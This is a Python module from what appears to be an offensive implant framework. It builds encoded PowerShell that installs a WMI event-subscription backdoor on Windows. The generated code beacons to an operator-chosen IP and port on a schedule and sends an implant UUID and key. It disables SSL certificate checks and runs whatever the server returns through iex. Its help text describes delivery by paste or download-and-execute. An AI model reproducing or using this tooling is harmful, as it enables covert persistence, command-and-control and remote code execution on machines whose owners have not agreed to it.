#!/usr/bin/python
import sys
from support.setting import setting
from base64 import b64encode


class create:
    #define info here
    beacon_settings='''
Beacon_Interval:   How often you want the beacon.  Select a number from the list below.
                   0  -- Every 15 Seconds 
                   1  -- Every Minute
                   2  -- Every 15 Minutes
                   3  -- Every 30 Minutes
                   4  -- Every 1 Hour
'''

    info = '''
This module will build a script for the creation of the WMI objects required to install a WMI based windows beaconer.

Settings:
UUID:              Implant UUID
Key:               Implant Key
IP:                The IP address you want the beaconer to beacon to.
PORT:              The port to use.
Filter:            Name of the WMI filter.  
Consumer:          Name of the WMI consumer.
OutputFile:        Filename of the locally generated file.
Beacon_Interval:   How often you want the beacon.  Enter a number from the list below.  Anything else will cause the module to exit.
                   0  -- Every 15 Seconds 
                   1  -- Every Minute
                   2  -- Every 15 Minutes
                   3  -- Every 30 Minutes
                   4  -- Every 1 Hour
                   5  -- Every 4 Hours
Once the payload has been generated, either copy and paste the commands into a system level powershell, or download via a powershell download and execute.
''' 
    #create a list of possible options
    option_list=["UUID","key","ip","port","filter","consumer","output_file","beacon_interval","use_ssl"]
   

    #initialize variables
    UUID=setting("UUID","",True,"Implant UUID")
    key=setting("key","",True,"Implant Key")
    ip=setting("ip","1.1.1.1",True,"beacon ip address")   
    port=setting("port","8080",True,"beacon port")
    use_ssl=setting("use_ssl","no",True,"use SSL for callback?")
    filter=setting("filter","",True,"name of WMI filter")   
    consumer=setting("consumer","",True,"name of WMI consumer")
    output_file=setting("output_file","",False,"local output filename")
    beacon_interval=setting("beacon_interval","",True,"beacon interval...see info for options")
    
    #initialize power_beacon class
    def __init__(self):
        self.name="powerbeacon"
    def run(self) :
        UUID=self.UUID.value
        key=self.key.value
        ip=self.ip.value
        port=self.port.value
        filter=self.filter.value
        consumer=self.consumer.value
        output=self.output_file.value
        interval=self.beacon_interval.value
        beacon=self.beacon_settings
        use_ssl=self.use_ssl.value
        try:
            interval=int(interval)           
        except:
            print "Invalid beacon_interval..."
            print beacon
            return
        if (interval < 0) or (interval > 5):
            print "Invalid beacon_interval..."
            print beacon
            return
         
        interval_setting=""
        if interval==1:
             interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=0\""
        if interval==2:
             interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1 OR TargetInstance.Minute=15 OR TargetInstance.Minute=30 OR TargetInstance.Minute=45) AND TargetInstance.Second=0\""
        if interval==3:
            interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1 OR TargetInstance.Minute=30) AND TargetInstance.Second=0\""
        if interval==4:
            interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1) AND TargetInstance.Second=0\""     
        if interval==5:
            interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Hour=0 OR TargetInstance.Hour=4 OR TargetInstance.Hour=8 OR TargetInstance.Hour=12 OR TargetInstance.Hour=16 OR TargetInstance.Hour=20) AND TargetInstance.Minute=1 AND TargetInstance.Second=0\""
        if interval==0:
            interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Second=0 OR TargetInstance.Second=15 OR TargetInstance.Second=30 OR TargetInstance.Second=45)\""

        address=ip + ":" + port
        if use_ssl == "yes":
            messageblock="[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex(New-Object Net.Webclient).UploadString('https://%s', \"{ 'UUID':'%s', 'key':'%s', 'event' : 'req' }\")" % (address,UUID,key)
            encodedmessage = b64encode(messageblock.encode('UTF-16LE')).decode('UTF-8')
            messageblock="\"powershell -e %s \"" % (encodedmessage)
        elif use_ssl=="no":   
            messageblock="\"powershell -command `\"iex(New-Object Net.Webclient).UploadString('http://%s', \`\"{ 'UUID':'%s', 'key':'%s', 'event' : 'req' }\`\")`\"\"" % (address,UUID,key)
        else:
            print "use_ssl must be either 'yes' or 'no'"
            return

        data='''
$instanceFilter = ([wmiclass]"\\\.\\root\subscription:__EventFilter").CreateInstance();
$instanceFilter.QueryLanguage = "WQL";
%s;
$instanceFilter.Name = "%s";
$instanceFilter.EventNamespace = 'root\cimv2';
$result = $instanceFilter.Put();
$newFilter = $result.Path;
$instanceConsumer = ([wmiclass]"\\\.\\root\subscription:CommandLineEventConsumer").CreateInstance();
$instanceConsumer.Name = '%s' ;
$instanceConsumer.CommandLineTemplate  = %s;
$result = $instanceConsumer.Put();
$newConsumer = $result.Path;
$instanceBinding = ([wmiclass]"\\\.\\root\subscription:__FilterToConsumerBinding").CreateInstance();
$instanceBinding.Filter = $newFilter;
$instanceBinding.Consumer = $newConsumer;
$result = $instanceBinding.Put();
$newBinding = $result.Path

''' % (interval_setting,filter,consumer,messageblock)

        remove_data= '''
$x="\\\.\\root\subscription:__EventFilter.Name='%s'"
([wmi]$x).Delete()
$x="\\\.\\root\subscription:CommandLineEventConsumer.Name='%s'"
([wmi]$x).Delete()
$x='\\\.\\root\subscription:__FilterToConsumerBinding.Consumer="\\\\\\\\.\\\\root\\\\subscription:CommandLineEventConsumer.Name=\\"%s\\"",Filter="\\\\\\\\.\\\\root\\\\subscription:__EventFilter.Name=\\"%s\\""'
([wmi]$x).Delete()
''' % (filter,consumer,consumer,filter)


        data = b64encode(data.encode('UTF-16LE')).decode('UTF-8')
        remove_data = b64encode(remove_data.encode('UTF-16LE')).decode('UTF-8')
        data = "powershell -e " + data
        remove_data = "powershell -e " + remove_data



        if output=='':
            print data
            print "\n"
            print "To Remove"
            print "---------------------------------"
            print remove_data
            return
        else:
            output="output/"+output
            f = open(output,'w')
            f.write(data)
            f.close()
            output=output+"_remove"
            f = open(output,'w')
            f.write(remove_data)
            f.close()
            print "Files have been written..."
            return




